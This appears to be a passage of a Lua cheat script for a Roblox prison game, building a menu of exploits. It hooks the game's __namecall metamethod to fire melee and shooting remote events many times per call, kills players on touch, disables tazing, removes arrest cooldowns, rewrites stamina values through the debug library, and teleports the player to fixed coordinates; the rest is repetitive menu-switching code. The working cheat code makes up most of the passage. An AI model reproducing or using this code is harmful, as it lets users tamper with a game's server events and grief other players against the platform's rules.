	local oldnamecall = getrawmetatable(game).__namecall
		do
			getrawmetatable(game).__namecall = newcclosure(function(...)
			local args = {...}
			local method = getnamecallmethod()
			if method == "FireServer" then
				local remoteName = args[1].Name
				if remoteName == "meleeEvent" and onep and not checkcaller() then
					for i = 1,14 do
						oldnamecall(...)
					end
				end
				end
				return oldnamecall(unpack(args))
			end)
			
		end
	script.Parent.MouseButton1Click:connect(function()
		if onep == false then
			onep = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			onep = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
	end)
end
coroutine.wrap(JUSQF_fake_script)()
local function GSARL_fake_script() -- ProjectAntiAbusers.AntiTouch.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.AntiTouch)

	notouchy = false
	script.Parent.MouseButton1Click:connect(function()
		if notouchy == false then
			notouchy = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			notouchy = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		local function kill(target)
			
			if game.Players:FindFirstChild(target.Name) then
				local person = game.Players:FindFirstChild(target.Parent.Name)
				if person.Name ~= game.Players.LocalPlayer.Name then
						if notouchy then
							for i = 1,10 do
								game.ReplicatedStorage.meleeEvent:FireServer(person)
							end
						end
				end
			end
		end
		local function died()
			wait(.7)
			if notouchy == true then
				game.Players.LocalPlayer.Character.Humanoid.Touched:connect(kill)
			end
		end
		if notouchy == true then
			game.Players.LocalPlayer.Character.Humanoid.Touched:connect(kill)
			game.Players.LocalPlayer.CharacterAdded:connect(died)
		end
	end)
end
coroutine.wrap(GSARL_fake_script)()
local function ILNN_fake_script() -- ProjectAntiAbusers.InfJump.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.InfJump)

	infjump = false
	script.Parent.MouseButton1Click:connect(function()
		if infjump == false then
			infjump = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			infjump = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		game:GetService("UserInputService").JumpRequest:connect(function()
			if infjump then
				game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
			end
		end)
	end)
end
coroutine.wrap(ILNN_fake_script)()
local function KLHKS_fake_script() -- ProjectAntiAbusers.NoArrestCooldown.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.NoArrestCooldown)

	nocool = false
	script.Parent.MouseButton1Click:connect(function()
		if nocool == false then
			nocool = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			nocool = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		local mouse = game.Players.LocalPlayer:GetMouse()
		local arrest = workspace.Remote.arrest
		mouse.Button1Down:connect(function()
			if game.Players.LocalPlayer.Character:FindFirstChild("Handcuffs") ~= nil then
				if nocool then
					arrest:InvokeServer(mouse.Target)
				end
			end
		end)
	end)
end
coroutine.wrap(KLHKS_fake_script)()
local function DGILU_fake_script() -- ProjectAntiAbusers.FullBright.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.FullBright)

	fb = false
	script.Parent.MouseButton1Click:connect(function()
		if fb == false then
			fb = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			fb = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while fb == true do
			wait()
			a = game.Lighting
			a.Ambient = Color3.new(1,1,1)
			a.ColorShift_Bottom = Color3.new(1,1,1)
			a.ColorShift_Top = Color3.new(1,1,1)
			a.OutdoorAmbient = Color3.new(1,1,1)
			a.FogEnd = 10000000
			a.FogStart = 100000000
			a.Brightness = 2
		end
		if fb == false then
			wait()
			a = game.Lighting
			a.Brightness = 1.5
			a.ColorShift_Bottom = Color3.new(0,0,0)
			a.ColorShift_Top = Color3.new(0,0,0)
			a.FogEnd = 1400
			a.FogStart = 800
			a.Ambient = Color3.new(109, 109, 109)
			a.OutdoorAmbient = Color3.new(222,222,222)
		end
	end)
end
coroutine.wrap(DGILU_fake_script)()
local function HUTAH_fake_script() -- ProjectAntiAbusers.RainbowBullet.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.RainbowBullet)

	rain = false
	script.Parent.MouseButton1Click:connect(function()
		if rain == false then
			rain = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			rain = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		do
			setreadonly(BrickColor, false)
			for i,v in next, BrickColor do
				if i ~= "random" then
					local old = v
					BrickColor[i] = newcclosure(function(...)
						local env = getfenv(2)
						if env.script and env.script.Parent ~= nil and env.script.Parent.ClassName == "Tool" then
							if rain then
								return BrickColor.random()
							end
						end
						return old(...)
					end)
				end
			end
			setreadonly(BrickColor, true)
		end
	end)
	
end
coroutine.wrap(HUTAH_fake_script)()
local function HBCTQH_fake_script() -- ProjectAntiAbusers.OneShotGuns.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.OneShotGuns)

	oneshot = false
	local oldnamecall = getrawmetatable(game).__namecall
		do
			getrawmetatable(game).__namecall = newcclosure(function(...)
				local args = {...}
				local method = getnamecallmethod()
				if method == "FireServer" then
					local remote = args[1].Name
					if remote == "ShootEvent" and oneshot and not checkcaller() then
						for i = 1,14 do
							oldnamecall(...)
						end
					end
				end
				return oldnamecall(unpack(args))
			end)	
		end
	script.Parent.MouseButton1Click:connect(function()
		if oneshot == false then
			oneshot = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			oneshot = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
	end)
end
coroutine.wrap(HBCTQH_fake_script)()
local function PJTSHKN_fake_script() -- ProjectAntiAbusers.RapidPunch.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.RapidPunch)

	spedp = false
	script.Parent.MouseButton1Click:connect(function()
		if spedp == false then
			spedp = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			spedp = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while spedp == true do
			local sped = getsenv(game.Players.LocalPlayer.Character:WaitForChild('ClientInputHandler'))
			sped.cs.isRunning = false
			sped.cs.isFighting = false
			wait()
		end
	end)
end
coroutine.wrap(PJTSHKN_fake_script)()
local function ESUYVH_fake_script() -- ProjectAntiAbusers.InfStamina.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.InfStamina)

	infsta = false
	script.Parent.MouseButton1Click:connect(function()
		if infsta == false then
			infsta = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			infsta = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while infsta do
			wait()
			local Player = game.Players.LocalPlayer
			Character = Player.Character
			ClientInputHandler = Character:WaitForChild("ClientInputHandler")
			for i,v in pairs(getreg()) do
				if (type(v) == "function") and (getfenv(v).script == ClientInputHandler) then
					for idx,upval in pairs(debug.getupvalues(v)) do
						if infsta then
							if (type(upval) == "number") and (upval >= 0) and (upval <= 12) then
								StaminaFunc = v
								StaminaVal = idx
							end
						end
					end
				end
			end
			if (StaminaFunc) and (StaminaVal) then
				debug.setupvalue(StaminaFunc, StaminaVal, 1)
			end
		end
	end)
end
coroutine.wrap(ESUYVH_fake_script)()
local function RHTXU_fake_script() -- ProjectAntiAbusers.AntiTaze.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.AntiTaze)

	function antitaze()
		for i,v in pairs(getconnections(workspace.Remote.tazePlayer.OnClientEvent)) do
			v:Disable()
		end
	end
	local function newAv()
		wait(.3)
		if notaze then
			antitaze()
		end
	end
	antitaze = false
	script.Parent.MouseButton1Click:connect(function()
		if antitaze == false then
			antitaze = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			antitaze = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		function antitazes()
			for i,v in pairs(getconnections(workspace.Remote.tazePlayer.OnClientEvent)) do
				v:Disable()
			end
		end
		local function characteradded()
			wait(0.5)
			if antitaze then
				antitazes()
			end
		end
		antitazes()
		game.Players.LocalPlayer.CharacterAdded:connect(characteradded)
	end)
end
coroutine.wrap(RHTXU_fake_script)()
local function MPDL_fake_script() -- ProjectAntiAbusers.BorderTp.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.BorderTp)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(778.280029, 396.23996, 2674.35278, 0.998099327, 4.16638704e-06, -0.0616256408, 3.69708708e-08, 1, 6.82067985e-05, 0.0616256408, -6.80794183e-05, 0.998099327)
	end)
end
coroutine.wrap(MPDL_fake_script)()
local function PIYZ_fake_script() -- ProjectAntiAbusers.NexusTp.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.NexusTp)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(955.158264, 99.9900055, 2358.90356, -0.0176578518, -5.05020853e-06, 0.999844074, -1.382882e-10, 1, 5.05099388e-06, -0.999844074, 8.90514329e-08, -0.0176578518)
	end)
end
coroutine.wrap(PIYZ_fake_script)()
local function VSJKU_fake_script() -- ProjectAntiAbusers.BridgeBaseTp.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.BridgeBaseTp)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-79.3232956, 11.3141584, 1343.36511, -0.00919567514, 8.67123262e-08, -0.99995774, -1.4924767e-09, 1, 8.67297132e-08, 0.99995774, 2.28995201e-09, -0.00919567514)
	end)
end
coroutine.wrap(VSJKU_fake_script)()
local function JYAWUUK_fake_script() -- ProjectAntiAbusers.CriminalBaseTp.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.CriminalBaseTp)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-884.486145, 94.0621567, 2090.56909, 0.0814632699, -9.34753608e-09, -0.996676326, 1.89659755e-08, 1, -7.82852538e-09, 0.996676326, -1.82652027e-08, 0.0814632699)
	end)
end
coroutine.wrap(JYAWUUK_fake_script)()
local function SHOGAVX_fake_script() -- ProjectAntiAbusers.SecretRoomTp.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.SecretRoomTp)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(705.315002, 99.9899979, 2365.11011, -0.0347304828, 2.15240914e-09, 0.999396741, -1.81297448e-08, 1, -2.78374346e-09, -0.999396741, -1.82154878e-08, -0.0347304828)
	end)
end
coroutine.wrap(SHOGAVX_fake_script)()
local function YGXVFQ_fake_script() -- ProjectAntiAbusers.RoofTp.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.RoofTp)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-323.041077, 118.838844, 1999.38574, -0.608225226, -8.79897115e-08, 0.793764472, 1.51119825e-10, 1, 1.10966951e-07, -0.793764472, 6.76128522e-08, -0.608225226)
	end)
end
coroutine.wrap(YGXVFQ_fake_script)()
local function CWOMOTR_fake_script() -- ProjectAntiAbusers.Sewers.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.Sewers)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(941.502441, 98.185318, 2109.5083, -0.999972224, 1.46662424e-08, -0.00745382067, 5.01872677e-09, 1, 1.29432351e-06, 0.00745382067, 1.29425007e-06, -0.999972224)
	end)
end
coroutine.wrap(CWOMOTR_fake_script)()
local function IFVJRXD_fake_script() -- ProjectAntiAbusers.CellsTp.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.CellsTp)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(899.07312, 99.9899673, 2483.07227, 0.587808311, 2.6799805e-08, 0.809000254, 2.51473598e-08, 1, -5.13987857e-08, -0.809000254, 5.05568529e-08, 0.587808311)
	end)
end
coroutine.wrap(IFVJRXD_fake_script)()
local function SOMGM_fake_script() -- ProjectAntiAbusers.WallTp.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.WallTp)

	script.Parent.MouseButton1Click:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(821.651611, 130.039948, 2566.95972, 0.999913871, -5.93622429e-10, -0.0131240478, 4.36904402e-10, 1, -1.19441559e-08, 0.0131240478, 1.19373933e-08, 0.999913871)
	end)
end
coroutine.wrap(SOMGM_fake_script)()
local function ETRPDCN_fake_script() -- ProjectAntiAbusers.MusicFeedback.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.MusicFeedback)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = true
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(ETRPDCN_fake_script)()
local function AOHYRG_fake_script() -- ProjectAntiAbusers.LocalFunctions.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.LocalFunctions)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = true
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(AOHYRG_fake_script)()
local function GSUDNA_fake_script() -- ProjectAntiAbusers.BringStuff.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.BringStuff)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = true
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(GSUDNA_fake_script)()
local function ZTLLMGR_fake_script() -- ProjectAntiAbusers.MiscFunctions.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.MiscFunctions)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = true
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(ZTLLMGR_fake_script)()
local function ZGLZY_fake_script() -- ProjectAntiAbusers.GunStuff.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.GunStuff)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = true
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(ZGLZY_fake_script)()
local function KARDGPT_fake_script() -- ProjectAntiAbusers.MassButton.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.MassButton)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = true
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(KARDGPT_fake_script)()
local function UFKLCT_fake_script() -- ProjectAntiAbusers.TpStuff.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.TpStuff)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = true
	end)
end
coroutine.wrap(UFKLCT_fake_script)()
local function XFHDRPA_fake_script() -- ProjectAntiAbusers.GlobalButtons.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.GlobalButtons)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = true
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(XFHDRPA_fake_script)()
local function RCIZHN_fake_script() -- ProjectAntiAbusers.TeamStuff.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.TeamStuff)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = true
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(RCIZHN_fake_script)()
local function NMOG_fake_script() -- ProjectAntiAbusers.Toggles.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.Toggles)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = true
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(NMOG_fake_script)()
local function RGDTKD_fake_script() -- ProjectAntiAbusers.OtherGUIs.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.OtherGUIs)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = true
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(RGDTKD_fake_script)()
local function WMZMQCQ_fake_script() -- ProjectAntiAbusers.KillAuraStuff.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillAuraStuff)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = true
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(WMZMQCQ_fake_script)()
local function SAEA_fake_script() -- ProjectAntiAbusers.Keybinds.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.Keybinds)

	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Parent.Parent.Parent.AdminStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.BringStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.CreditsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GlobalButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.GunstuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.KeyBindsFrame.Visible = true
		script.Parent.Parent.Parent.Parent.KillAuraTogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.LocalFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MassButtonsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MiscFunctionsFrame.Visible = false
		script.Parent.Parent.Parent.Parent.MusicFeedbackFrame.Visible = false
		script.Parent.Parent.Parent.Parent.OtherGuisFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TeamStuffFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TogglesFrame.Visible = false
		script.Parent.Parent.Parent.Parent.TpStuffFrame.Visible = false
	end)
end
coroutine.wrap(SAEA_fake_script)()
